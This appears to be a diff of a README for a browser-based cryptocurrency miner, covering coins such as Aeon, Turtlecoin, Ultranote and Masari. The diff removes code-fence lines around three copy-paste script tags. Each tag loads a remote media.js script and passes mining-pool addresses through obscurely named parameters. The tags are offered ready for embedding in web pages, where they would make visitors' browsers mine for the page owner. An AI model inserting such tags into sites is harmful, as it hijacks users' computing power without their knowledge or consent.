@@ -21,11 +21,7 @@ Attention: IPBC created their own PoW variant....so mining is disabled for the m
 #### Attention: Special Case for some custom cn-lite variant fork coins: Aeon, Turtlecoin Ultranote need ?algo=cn-lite?variant=1
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=mine.supportaeon.com:3333" > </script>
-```
-```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=Pool.TRTL.CryptoPool.Space:5555" > </script>
-```
-```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=alpha.ultranote.org:5555" > </script>
 ```
 #### Attention: Special Case for some custom cn-fast | POW coins: Masari need ?algo=cn/msr?variant=1<br> 
